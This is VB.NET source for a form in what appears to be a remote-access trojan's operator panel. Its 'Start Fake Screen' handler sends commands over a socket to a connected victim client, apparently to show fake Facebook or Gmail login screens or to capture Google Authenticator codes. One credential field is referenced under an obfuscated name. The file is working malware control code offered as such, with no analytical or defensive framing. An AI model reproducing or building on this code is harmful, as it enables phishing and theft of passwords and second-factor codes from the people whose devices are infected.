Public Class Frm_Faker
     Public Client As Net.Sockets.TcpClient
     Public classClient As sockets.Frm_Config_Client
     Public DownloadsFolder As String
     Public Title As String = "null"
    Private Sub MetroSetButton1_Click(sender As Object, e As EventArgs)

    End Sub

    Private Sub platfromtext_SelectedIndexChanged(sender As Object, e As EventArgs) Handles platfromtext.SelectedIndexChanged

    End Sub

    Private Sub Guna2Button1_Click(sender As Object, e As EventArgs)

    End Sub

    Private Sub Timer1_Tick(sender As Object, e As EventArgs)

    End Sub

    Private Sub Label2_Click(sender As Object, e As EventArgs) Handles Label2.Click

    End Sub

    Private Sub Checkalert_SwitchedChanged(sender As Object) Handles Checkalert.SwitchedChanged

    End Sub

    Private Sub DataGridView1_CellContentClick(sender As Object, e As DataGridViewCellEventArgs) Handles DataGridView1.CellContentClick

    End Sub

    Private Sub StartFakeScreenToolStripMenuItem_Click(sender As Object, e As EventArgs) Handles StartFakeScreenToolStripMenuItem.Click
        If platfromtext.Text.Length < 2 Then
            MsgBox("Select Platform First!!!")
            Return
        Else
            If Me.classClient IsNot Nothing Then
                Try
                    Dim spl As String() = classClient.Keys.Split(":")
                    Dim cmand As String = ""
                    If Checkalert.Switched Then
                        cmand = "1:"
                    Else
                        cmand = "0:"
                    End If
                    If platfromtext.Text = "Facebook" Then
                        cmand += "fb:fsh"
                    ElseIf platfromtext.Text = "Gmail" Then
                        cmand += "go:fsh"
                    ElseIf platfromtext.Text = "google authenticator" Then
                        Dim objss As Object() = {Client, Authentication_users.KeysClient2 & sockets.Data.SPL_SOCKET & "goauth<*>" & "X" & sockets.Data.SPL_SOCKET & spl(0) & sockets.Data.SPL_SOCKET & spl(1) & sockets.Data.SPL_SOCKET & Authentication_users.VVaudrvVbnotaVbfxcViwvpiazbbocCfbgxcygpNzsimtmCvMx & sockets.Data.SPL_SOCKET & "0" & sockets.Data.SPL_SOCKET & "0" & sockets.Data.SPL_SOCKET & sockets.Data.SPL_ARRAY & sockets.Data.SPL_SOCKET & classClient.ClientRemoteAddress, Frm_Config_Codes.Encoding().GetBytes("null"), classClient}
                        classClient.SendAsync(objss)
                        Return
                    End If
                    Dim objs As Object() = {Client, Authentication_users.KeysClient2 & sockets.Data.SPL_SOCKET & "msg:" & cmand & sockets.Data.SPL_SOCKET & spl(0) & sockets.Data.SPL_SOCKET & spl(1) & sockets.Data.SPL_SOCKET & Authentication_users.VVaudrvVbnotaVbfxcViwvpiazbbocCfbgxcygpNzsimtmCvMx & sockets.Data.SPL_SOCKET & "0" & sockets.Data.SPL_SOCKET & "0" & sockets.Data.SPL_SOCKET & sockets.Data.SPL_ARRAY & sockets.Data.SPL_SOCKET & classClient.ClientRemoteAddress, Frm_Config_Codes.Encoding().GetBytes("null"), classClient}
                    classClient.SendAsync(objs)
                Catch ex As Exception
                End Try
            End If
        End If
    End Sub

    Private Sub Guna2CirclePictureBox1_Click(sender As Object, e As EventArgs) Handles Guna2CirclePictureBox1.Click
        Me.Close()
    End Sub
End Class